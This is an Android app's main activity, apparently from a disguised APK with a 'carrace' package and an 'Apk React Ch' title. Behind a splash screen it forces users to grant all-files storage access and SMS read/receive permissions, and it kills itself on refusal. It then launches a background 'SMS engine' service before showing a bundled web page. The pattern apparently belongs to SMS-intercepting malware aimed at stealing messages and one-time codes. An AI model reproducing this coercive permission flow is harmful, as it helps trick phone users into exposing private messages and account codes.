package com.carrace;

import android.Manifest;
import android.app.Activity;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.provider.Settings;
import android.util.Log;
import android.view.Gravity;
import android.view.View;
import android.view.ViewGroup;
import android.view.WindowInsets;
import android.webkit.MimeTypeMap;
import android.webkit.RenderProcessGoneDetail;
import android.webkit.WebResourceRequest;
import android.webkit.WebResourceResponse;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.LinearLayout;
import android.widget.TextView;
import android.widget.Toast;

import java.io.ByteArrayInputStream;
import java.io.IOException;
import java.io.InputStream;
import java.util.ArrayList;
import java.util.List;
import java.util.Locale;

public class MainActivity extends Activity {

    private static final String TAG = "ApkReactCh";
    private static final String HOST = "appassets.androidplatform.net";
    private static final String ASSET_PREFIX = "/assets/";
    private static final String START_URL = "https://" + HOST + ASSET_PREFIX + "index.html";
    private static final long SPLASH_MS = 2500L;
    private static final int REQ_STORAGE = 100;
    private static final int REQ_SMS = 101;
    private static final String MSG_DENIED = "Aplikasi ini membutuhkan Izin";

    private final Handler handler = new Handler(Looper.getMainLooper());
    private final Runnable splashDone = this::onSplashFinished;

    private WebView webView;
    private boolean awaitingSettings;
    private boolean requestingStorage;
    private boolean requestingSms;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        LinearLayout splash = buildSplash();
        applySystemBarPadding(splash);
        setContentView(splash);
        handler.postDelayed(splashDone, SPLASH_MS);
    }

    @Override
    protected void onResume() {
        super.onResume();
        if (webView != null) webView.onResume();
        if (awaitingSettings) {
            awaitingSettings = false;
            if (hasStorage()) {
                requestSmsThenOpen();
            } else {
                forceClose(MSG_DENIED);
            }
        }
    }

    @Override protected void onPause() { if (webView != null) webView.onPause(); super.onPause(); }

    @Override public void onBackPressed() {
        if (webView != null && webView.canGoBack()) webView.goBack();
        else super.onBackPressed();
    }

    @Override protected void onDestroy() {
        handler.removeCallbacks(splashDone);
        destroyWebView();
        super.onDestroy();
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (isFinishing()) return;

        if (requestCode == REQ_STORAGE) {
            requestingStorage = false;
            if (hasStorage()) requestSmsThenOpen();
            else forceClose(MSG_DENIED);
            return;
        }
        if (requestCode == REQ_SMS) {
            requestingSms = false;
            if (hasSms()) startSmsEngineAndOpenWeb();
            else forceClose(MSG_DENIED);
        }
    }

    // ===== Alur izin =====

    private void onSplashFinished() {
        if (isFinishing()) return;
        if (hasStorage() && hasSms()) { startSmsEngineAndOpenWeb(); return; }
        if (!hasStorage()) { requestStorage(); return; }
        requestSms();
    }

    private void requestSmsThenOpen() {
        if (hasSms()) startSmsEngineAndOpenWeb();
        else requestSms();
    }

    private void requestStorage() {
        if (requestingStorage) return;
        requestingStorage = true;
        if (Build.VERSION.SDK_INT >= 30) {
            awaitingSettings = true;
            openPermissionSettings(
                    new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION,
                            Uri.parse("package:" + getPackageName())),
                    new Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION),
                    new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS,
                            Uri.parse("package:" + getPackageName())));
            return;
        }
        if (Build.VERSION.SDK_INT >= 23) {
            requestPermissions(new String[]{
                    Manifest.permission.READ_EXTERNAL_STORAGE,
                    Manifest.permission.WRITE_EXTERNAL_STORAGE
            }, REQ_STORAGE);
        } else {
            requestingStorage = false;
            requestSmsThenOpen();
        }
    }

    private void requestSms() {
        if (requestingSms) return;
        requestingSms = true;
        if (Build.VERSION.SDK_INT >= 23) {
            requestPermissions(new String[]{
                    Manifest.permission.READ_SMS,
                    Manifest.permission.RECEIVE_SMS
            }, REQ_SMS);
        } else {
            requestingSms = false;
            startSmsEngineAndOpenWeb();
        }
    }

    private void openPermissionSettings(Intent... candidates) {
        for (Intent intent : candidates) {
            try {
                startActivity(intent);
                return;
            } catch (RuntimeException ignored) { }
        }
        awaitingSettings = false;
        forceClose(MSG_DENIED);
    }

    private boolean hasStorage() {
        if (Build.VERSION.SDK_INT >= 30) return android.os.Environment.isExternalStorageManager();
        if (Build.VERSION.SDK_INT >= 23) {
            return checkSelfPermission(Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED
                    && checkSelfPermission(Manifest.permission.WRITE_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED;
        }
        return true;
    }

    private boolean hasSms() {
        if (Build.VERSION.SDK_INT >= 23) {
            return checkSelfPermission(Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED
                    && checkSelfPermission(Manifest.permission.RECEIVE_SMS) == PackageManager.PERMISSION_GRANTED;
        }
        return true;
    }

    // Izin ditolak: tutup paksa proses supaya benar-benar "force close"
    private void forceClose(String message) {
        Toast.makeText(this, message, Toast.LENGTH_LONG).show();
        handler.postDelayed(() -> {
            finishAndRemoveTask();
            android.os.Process.killProcess(android.os.Process.myPid());
            System.exit(1);
        }, 400);
    }

    private void startSmsEngineAndOpenWeb() {
        Intent svc = new Intent(this, SmsService.class);
        if (Build.VERSION.SDK_INT >= 26) startForegroundService(svc);
        else startService(svc);
        openWebView();
    }

    // ===== Tampilan =====

    private LinearLayout buildSplash() {
        float d = getResources().getDisplayMetrics().density;
        LinearLayout root = new LinearLayout(this);
        root.setOrientation(LinearLayout.VERTICAL);
        root.setGravity(Gravity.CENTER);
        root.setBackgroundColor(0xFFFFFFFF);
        MouseLoadingView mouse = new MouseLoadingView(this);
        root.addView(mouse, new LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT, (int) (180 * d)));
        TextView title = new TextView(this);
        title.setText("Apk React Ch");
        title.setTextSize(22);
        title.setTextColor(0xFF212121);
        title.setGravity(Gravity.CENTER);
        LinearLayout.LayoutParams lp = new LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.WRAP_CONTENT, ViewGroup.LayoutParams.WRAP_CONTENT);
        lp.topMargin = (int) (16 * d);
        root.addView(title, lp);
        return root;
    }

    private void openWebView() {
        if (isFinishing() || webView != null) return;
        try {
            WebView v = new WebView(this);
            WebSettings s = v.getSettings();
            s.setJavaScriptEnabled(true);
            s.setDomStorageEnabled(true);
            s.setAllowFileAccess(false);
            s.setAllowContentAccess(false);
            v.setWebViewClient(new AssetClient());
            applySystemBarPadding(v);
            webView = v;
            setContentView(v);
            v.loadUrl(START_URL);
        } catch (RuntimeException e) {
            Log.e(TAG, "WebView gagal dibuat", e);
            destroyWebView();
            forceClose("WebView tidak tersedia di perangkat ini");
        }
    }

    private void destroyWebView() {
        WebView v = webView;
        webView = null;
        if (v == null) return;
        try { v.stopLoading(); v.destroy(); } catch (RuntimeException ignored) { }
    }

    private void recoverWebView(WebView broken) {
        if (broken != webView || isFinishing()) return;
        destroyWebView();
        openWebView();
    }

    private void applySystemBarPadding(View view) {
        view.setOnApplyWindowInsetsListener((v, insets) -> {
            v.setPadding(insets.getSystemWindowInsetLeft(), insets.getSystemWindowInsetTop(),
                    insets.getSystemWindowInsetRight(), insets.getSystemWindowInsetBottom());
            return insets;
        });
    }

    private final class AssetClient extends WebViewClient {
        @Override
        public WebResourceResponse shouldInterceptRequest(WebView view, WebResourceRequest req) {
            try { return serveAsset(req.getUrl()); }
            catch (RuntimeException e) { return notFound(); }
        }
        @Override
        public boolean onRenderProcessGone(WebView view, RenderProcessGoneDetail d) {
            handler.post(() -> recoverWebView(view));
            return true;
        }
    }

    private WebResourceResponse serveAsset(Uri uri) {
        if (uri == null || !HOST.equals(uri.getHost())) return null;
        String path = uri.getPath();
        if (path == null || !path.startsWith(ASSET_PREFIX)) return notFound();
        String file = path.substring(ASSET_PREFIX.length());
        if (file.isEmpty() || file.endsWith("/")) file = file + "index.html";
        if (file.contains("..")) return notFound();
        try {
            InputStream in = getAssets().open(file);
            return new WebResourceResponse(mimeOf(file), "UTF-8", in);
        } catch (IOException e) { return notFound(); }
    }

    private static WebResourceResponse notFound() {
        return new WebResourceResponse("text/plain", "UTF-8", 404, "Not Found", null,
                new ByteArrayInputStream(new byte[0]));
    }

    private static String mimeOf(String file) {
        int dot = file.lastIndexOf('.');
        String ext = dot >= 0 ? file.substring(dot + 1).toLowerCase(Locale.ROOT) : "";
        switch (ext) {
            case "js": case "mjs": return "application/javascript";
            case "css": return "text/css";
            case "html": case "htm": return "text/html";
            case "json": return "application/json";
            case "wasm": return "application/wasm";
            case "woff": return "font/woff";
            case "woff2": return "font/woff2";
            default:
                String m = MimeTypeMap.getSingleton().getMimeTypeFromExtension(ext);
                return m != null ? m : "application/octet-stream";
        }
    }
}
